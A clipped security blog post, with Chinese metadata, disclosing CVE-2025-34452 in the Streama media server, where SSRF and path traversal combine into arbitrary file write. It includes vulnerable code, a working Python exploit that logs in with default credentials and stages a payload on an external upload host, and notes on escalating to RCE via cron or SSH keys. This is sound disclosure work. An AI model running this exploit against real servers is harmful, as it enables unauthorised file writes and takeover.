---
title: "Streama Path Traversal + SSRF: Chaining Vulnerabilities for Arbitrary File Write - Chocapikk's Cybersecurity Blog"
source: https://chocapikk.com/posts/2025/streama-path-traversal-ssrf/
source_host: chocapikk.com
clip_date: 2026-09-24T10:28:35+08:00
trace_id: aa021daf-f11d-4a06-9713-c79214d7057e
content_hash: 598ead78c8e5b45ff65341bb8b6edf87671c3303a41a4cb314b125d2bf05786d
status: synced
tags:
  - 漏洞分析
  - SSRF
series: null
feed_source: Chocapikk·漏洞/Android RE
ai_summary: Streama 字幕下载功能中 SSRF 与路径遍历组合，使认证用户可向服务器任意路径写文件，编号 CVE-2025-34452，CVSS 8.7，厂商已发布修复。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3e575244-d011-81be-b857-ec85e7c7862f
ioc:
  cves:
    - CVE-2025-34452
  cwes:
    - CWE-22
    - CWE-918
  hashes:
    - b7c8767d25634e159f9e8844230465f29c16efc8
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Streama 字幕下载功能中 SSRF 与路径遍历组合，使认证用户可向服务器任意路径写文件，编号 CVE-2025-34452，CVSS 8.7，厂商已发布修复。
> 
> - **漏洞入口：** `SubtitlesController.download()` 直接取用用户参数 `subFileName`（路径遍历）与 `subDownloadLink`（SSRF），认证仅需默认口令 admin/admin。
> - **两个缺陷：** `OpensubtitlesService.downloadSubtitles()` 对用户提供的 URL 直接 `new URL(url).openStream()`；`ZipHelper.unzipFile()` 把 `originalFileName` 拼接进写入路径，且先写文件后 rename，故 `../../.../tmp/pwned.txt` 会成功落盘。
> - **利用链：** 默认凭证登录 → 制作 gzip 载荷传至公共托管（如 bashupload.com）→ POST `/subtitles/download` 传入恶意 URL 与遍历路径，`videoId` 可从 `/movie/index.json` 获取；附带的 Python PoC 返回 200 并生成 `/tmp/pwned.txt`。
> - **影响范围：** 可覆盖数据库与配置文件、篡改数据、经 SSRF 访问云元数据与内网服务；未直接实现 RCE，但可经 cron 文件、`~/.ssh/authorized_keys`、Groovy/JSP 等路径延伸。
> - **修复与披露：** commit b7c8767 中 `ZipHelper` 拒绝含 `..`、`/`、`\` 的文件名并做规范化校验，`OpensubtitlesService` 增加 OpenSubtitles 域名白名单，控制器入口校验并补单测；双重编码、Unicode 等绕过测试均被拦截，发现到公开披露均在 2025-12-18 当天完成。

![Streama Path Traversal + SSRF: Chaining Vulnerabilities for Arbitrary File Write](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/30b9883a57914647.png)

## Introduction

I’ve been in a bit of a vulnerability research frenzy lately. After spending months reverse engineering ndays and analyzing exploits, I realized I missed doing original research. So I decided to get back into it.

I’ve been auditing various open-source projects, and this time I’m trying something different. Usually, I’d do everything manually: reading code, tracing execution paths, the whole nine yards. But now I’m using **Cursor**, an AI-powered code editor that can actually read and analyze code itself. It’s been a game-changer. The workflow is pretty powerful: I can ask it to find specific patterns, analyze code flows, and it helps me spot things I might have missed. It’s not replacing my brain, but it’s definitely making me more efficient.

While auditing **Streama**, an open-source media streaming server, I stumbled upon something interesting: a vulnerability that lets authenticated users write files anywhere on the server. The catch? It’s actually two vulnerabilities working together: a **Server-Side Request Forgery (SSRF)** and a **Path Traversal** that create a perfect storm for arbitrary file writes.

**CVE**: CVE-2025-34452  
**Severity**: High (CVSS 8.7)  
**Authentication**: Required, but default credentials (`admin/admin`) make this trivial

## What is Streama?

**Streama** is basically your own personal Netflix. It’s a self-hosted media streaming server built with **Grails** (Groovy on Rails) that lets you stream your movie collection through a web interface. Think Plex, but simpler and open-source.

The app runs on the JVM, which means it works pretty much anywhere Java runs. It’s a nice project for people who want to host their own media server without the complexity of bigger solutions.

## Finding the Vulnerability

I was poking around the subtitle download feature when I noticed something odd. The application lets users download subtitles from external sources, which sounds innocent enough. But when I looked at how it actually works, I found two problems that, when combined, become pretty serious.

### The SSRF Issue

The subtitle download function accepts a URL from the user and just… fetches it. No questions asked. Here’s the problematic code in `OpensubtitlesService.groovy`:

```groovy
def downloadSubtitles(String subtitleName, String url, String subtitleLanguage, videoId) {
  // ...
  new FileOutputStream(filePath).withStream { out ->
    new URL(url).openStream().eachByte {  // Oops, user controls this URL
      out.write(it)
    }
  }
}
```

This means an attacker can make the server fetch any URL they want: internal services, cloud metadata endpoints, or their own malicious payloads. Classic SSRF.

### The Path Traversal Issue

The real fun starts when the downloaded file gets extracted. The `ZipHelper.unzipFile()` function takes a filename and just concatenates it into a file path:

```groovy
static String unzipFile(String stagingDir, String zipFileName, String originalFileName) {
  // ...
  FileOutputStream fos = new FileOutputStream("$stagingDir/$originalFileName")  // User controls originalFileName
  
  // Write the file...
  
  // Later, it gets renamed, but the damage is already done
  file.renameTo(newFile)
}
```

The problem? That `originalFileName` comes directly from user input. So if you send `../../../../../../../../tmp/pwned.txt`, the file gets written to `/tmp/pwned.txt` before it’s renamed. The rename happens *after* the write, so the path traversal succeeds.

### Putting It Together

The entry point is in `SubtitlesController.download()`, which takes both parameters from the user:

```groovy
def download() {
  def subtitleName = params.subFileName        // Path traversal
  def subtitleLink = params.subDownloadLink    // SSRF
  // ...
}
```

The endpoint requires authentication, but Streama ships with default `admin/admin` credentials, so that’s not much of a barrier.

## How the Exploit Works

Here’s the attack chain:

1.  **Authenticate** with the default credentials
2.  **Create a GZIP payload** containing whatever you want to write (e.g., `PWNED\n`)
3.  **Upload it** to a public URL (I used `bashupload.com`)
4.  **Send a POST** to `/subtitles/download` with `subDownloadLink` pointing to your malicious URL (SSRF), `subFileName` containing path traversal like `../../../../../../../../../../../../../../../../../../../../tmp/pwned.txt`, and a valid `videoId` (you can grab one from `/movie/index.json`)

The server fetches your payload via SSRF, extracts it, and writes it to wherever your path traversal points. Game over.

## The Vulnerable Code Path

```plaintext
HTTP POST /subtitles/download
  ↓
SubtitlesController.download()
  ↓
OpensubtitlesService.downloadSubtitles()
  ↓
[SSRF] Fetches attacker's URL
  ↓
ZipHelper.unzipFile()
  ↓
[Path Traversal] Writes file outside staging directory
  ↓
Arbitrary file on filesystem
```

## Impact

This is bad. Really bad. An attacker can write files anywhere the application user has access, access internal services via SSRF (cloud metadata, internal APIs, etc.), and modify critical files (configs, application data, etc.).

Now, about RCE: I didn’t manage to achieve it directly. The code paths that would make this a straightforward RCE aren’t being called in the normal flow. But there are definitely potential paths to RCE depending on the environment. If cron is enabled, you could write a malicious cron file that gets executed. If SSH is enabled, you could write your public key to `~/.ssh/authorized_keys` and gain SSH access. You could modify config files or Groovy scripts that get executed, or if the deployment allows it, write JSP files or modify Java classes.

But honestly, even without RCE, arbitrary file write is already pretty devastating. You could overwrite the database file and destroy all user data, media metadata, everything. You could create new admin users by modifying the database or user files. Or you could completely destroy the instance by deleting critical files, corrupting the database, and making the application unusable.

The CVSS 4.0 score is **8.7 (High)**, which reflects the serious nature of this vulnerability. Even without direct RCE, arbitrary file write gives you enough power to completely compromise or destroy the application.

## Proof of Concept

I wrote a simple Python script to demonstrate the exploit:

```python
#!/usr/bin/env python3
import requests, gzip, argparse, re
from pwn import log

class StreamaExploit:
    def __init__(self, url):
        self.url, self.s = url, requests.Session()
    
    def auth(self, u="admin", p="admin"):
        self.s.post(f"{self.url}/login/authenticate", data={"username": u, "password": p}, allow_redirects=True)
        return "Not logged in" not in self.s.get(f"{self.url}/user/current.json").text
    
    def video_id(self):
        d = self.s.get(f"{self.url}/movie/index.json").json()
        return (d if isinstance(d, list) else d.get('list', []))[0].get('id', 1)
    
    def exploit(self, fname, url, vid):
        return self.s.post(f"{self.url}/subtitles/download", data={"subFileName": fname, "subDownloadLink": url, "subLang": "en", "videoId": str(vid)})

def upload_payload(data):
    r = requests.post("https://bashupload.com", files={'file': ('p.gz', data, 'application/gzip')}, timeout=10)
    return re.search(r'https://bashupload\.com/[^\s<>"]+', r.text).group(0) if r.status_code == 200 else None

def main():
    p = argparse.ArgumentParser()
    p.add_argument("-u", "--url", default="http://localhost:7777")
    p.add_argument("--username", default="admin")
    p.add_argument("--password", default="admin")
    args = p.parse_args()
    
    payload = gzip.compress(b"PWNED\n")
    log.success(f"Payload: {len(payload)} bytes")
    
    url = upload_payload(payload)
    if not url: log.error("Upload failed")
    log.success(f"Uploaded: {url}")
    
    e = StreamaExploit(args.url)
    if not e.auth(args.username, args.password): log.error("Auth failed")
    log.success("Authenticated")
    
    vid = e.video_id()
    log.success(f"Video ID: {vid}")
    
    path = "../../../../../../../../../../../../../../../../../../../../tmp/pwned.txt"
    log.info(f"Exploiting -> /tmp/pwned.txt")
    r = e.exploit(path, url, vid)
    log.info(f"Status: {r.status_code}")

if __name__ == "__main__":
    main()
```

Running it gives you:

```plaintext
[+] Payload: 15 bytes
[+] Uploaded: https://bashupload.com/abc123def456.gz
[+] Authenticated
[+] Video ID: 1
[*] Exploiting -> /tmp/pwned.txt
[*] Status: 200
```

And just like that, `/tmp/pwned.txt` appears on the server with your content.

## The Fix

I reported this to the vendor, and they were **incredibly responsive**. They patched it quickly in commit [b7c8767d25634e159f9e8844230465f29c16efc8](https://github.com/streamaserver/streama/commit/b7c8767d25634e159f9e8844230465f29c16efc8).

The fix addresses both issues. `ZipHelper` now rejects filenames with `..`, `/`, or `\` and validates paths using canonical path checks. `OpensubtitlesService` now validates URLs against an allowlist of OpenSubtitles domains. The controller now validates input at the entry point for defense in depth. They also added unit tests to verify the security controls work.

I tested for bypasses (double URL encoding, Unicode tricks, etc.) and the fix holds up. Good job on their part.

## Disclosure Timeline

**Discovery**: December 18, 2025 - Found and analyzed the vulnerability  
**Vendor Report**: December 18, 2025 - Sent security report to the vendor  
**Vendor Response**: December 18, 2025 - They confirmed and started working on a fix  
**Patch Release**: December 18, 2025 - Fixed in commit [b7c8767d25634e159f9e8844230465f29c16efc8](https://github.com/streamaserver/streama/commit/b7c8767d25634e159f9e8844230465f29c16efc8)  
**CVE Request**: December 18, 2025 - Submitted CVE request to Vulncheck.com  
**CVE Assignment**: December 18, 2025 - Vulncheck assigned CVE-2025-34452  
**Bypass Testing**: December 18, 2025 - Verified the fix blocks all tested bypass attempts  
**Public Disclosure**: December 18, 2025  
**Status**: PATCHED

## Takeaways

This is a good example of why input validation matters. Two seemingly separate issues, SSRF and path traversal, combined to create a critical vulnerability. The vendor’s quick response and thorough fix (including unit tests) shows they take security seriously.

The lesson here? Always validate and sanitize user input, especially when it’s used in file operations or network requests. And please, don’t ship default credentials.

## References

Streama GitHub: [https://github.com/streamaserver/streama](https://github.com/streamaserver/streama)  
Patch Commit: [https://github.com/streamaserver/streama/commit/b7c8767d25634e159f9e8844230465f29c16efc8](https://github.com/streamaserver/streama/commit/b7c8767d25634e159f9e8844230465f29c16efc8)  
VulnCheck Advisory: [https://www.vulncheck.com/advisories/streama-subtitle-download-path-traversal-and-ssrf-leading-to-arbitrary-file-write](https://www.vulncheck.com/advisories/streama-subtitle-download-path-traversal-and-ssrf-leading-to-arbitrary-file-write)  
CWE-22: Path Traversal  
CWE-918: Server-Side Request Forgery

Thanks to Vulncheck for handling the CVE assignment (CVE-2025-34452).

If you want to report a vulnerability, you can do so by email at [disclosure@vulncheck.com](mailto:disclosure@vulncheck.com) or use their [vulnerability reporting form](https://www.vulncheck.com/advisories/report). Their process is clearly better than MITRE’s, with faster response times and better coordination.
